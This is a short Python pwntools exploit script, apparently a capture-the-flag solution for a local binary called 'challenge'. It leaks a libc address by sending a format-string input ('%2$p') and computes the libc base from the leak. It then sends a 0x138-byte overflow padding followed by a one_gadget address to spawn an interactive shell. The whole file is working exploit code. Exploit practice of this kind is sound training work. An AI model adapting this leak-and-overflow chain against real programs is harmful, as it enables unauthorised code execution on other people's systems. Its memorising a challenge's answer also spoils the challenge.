from pwn import *

context.binary = elf = ELF("./challenge")
libc = elf.libc
gadgets = [324254,324261,324354,1090300]

# p = process("./challenge")
p = remote("localhost", 32931)
p.sendlineafter(b"characters): ", b"%2$p")
p.sendlineafter(b"10): ", b"2")
p.recvuntil(b"book '")
libc.address = int(p.recvuntil(b"'", drop=True), 16) - 4118720
print(hex(libc.address))

payload = b"A"*0x138
payload += p64(libc.address + gadgets[0])
p.sendline(payload)
p.sendlineafter(b"1): ", b"0")

p.interactive()

